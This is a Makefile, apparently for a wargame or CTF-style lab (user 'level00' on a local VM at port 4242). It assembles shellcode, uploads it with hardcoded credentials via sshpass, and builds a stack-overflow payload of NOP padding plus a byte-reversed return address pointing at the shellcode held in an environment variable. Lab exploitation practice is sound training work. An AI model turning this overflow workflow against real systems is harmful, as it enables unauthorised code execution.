ASM          = payload.asm
OBJ          = shellcode.o
ELF          = shellcode
BIN          = shellcode.bin
PAYLOAD      = payload.bin

GETENV_SRC   = getenv_addr.c
GETENV_BIN   = c4se
RET_FILE     = ret_addr
NOP_COUNT    = 88

HOST         = localhost
PORT         = 4242
USER         = level00
PASS         = level00
REMOTE_DIR   = /home/level00

SSH_OPTS     = -p $(PORT)
SCP_OPTS     = -P $(PORT)
SSH          = sshpass -p $(PASS) ssh $(SSH_OPTS) $(USER)@$(HOST)
SCP          = sshpass -p $(PASS) scp $(SCP_OPTS)

SHELL := /bin/bash

all: copy-bin setup-remote copy-payload

$(ELF): $(ASM)
	nasm -f elf64 $(ASM) -o $(OBJ)
	ld -m elf_x86_64 $(OBJ) -o $(ELF)
	rm -f $(OBJ)

$(BIN): $(ELF)
	objcopy -O binary -j .text $(ELF) $(BIN)

# push shellcode.bin to the VM
copy-bin: $(BIN) export-env
	$(SCP) $(BIN) $(USER)@$(HOST):$(REMOTE_DIR)/$(BIN)

# push getenv_addr.c and compile it as c4se on the VM (not executed here)
setup-remote: $(GETENV_SRC)
	$(SCP) $(GETENV_SRC) $(USER)@$(HOST):$(REMOTE_DIR)/$(GETENV_SRC)
	$(SSH) "gcc $(REMOTE_DIR)/$(GETENV_SRC) -o $(REMOTE_DIR)/$(GETENV_BIN)"

# env var must be set in the SAME interactive shell that runs c4se/the exploit,
# so this just prints the command to run manually on the VM
export-env:
	@echo 'Run on the VM, in the session you will use to get the address:'
	@echo '  export SHELLCODE=$$(cat $(REMOTE_DIR)/$(BIN))'

# manually record the address printed by c4se: make ret-addr ADDR=00007fffffffe210
ret-addr:
	@test -n "$(ADDR)" || { echo "Usage: make ret-addr ADDR=<hex address>"; exit 1; }
	echo -n "$(ADDR)" > $(RET_FILE)

$(PAYLOAD): ret-addr-check
	{ \
		printf '90%.0s' $$(seq 1 $(NOP_COUNT)); \
		cat $(RET_FILE) | fold -w2 | tac | tr -d '\n'; \
	} | xxd -r -p > $(PAYLOAD)
	xxd $(PAYLOAD)

ret-addr-check:
	@test -s $(RET_FILE) || { echo "Missing $(RET_FILE): run 'make ret-addr ADDR=...' first"; exit 1; }

copy-payload: $(PAYLOAD)
	$(SCP) $(PAYLOAD) $(USER)@$(HOST):$(REMOTE_DIR)/payload.bin

clean:
	rm -f $(OBJ) $(ELF) $(BIN) $(PAYLOAD) $(RET_FILE)

re: clean all

.PHONY: all clean re copy-bin setup-remote export-env ret-addr ret-addr-check copy-payload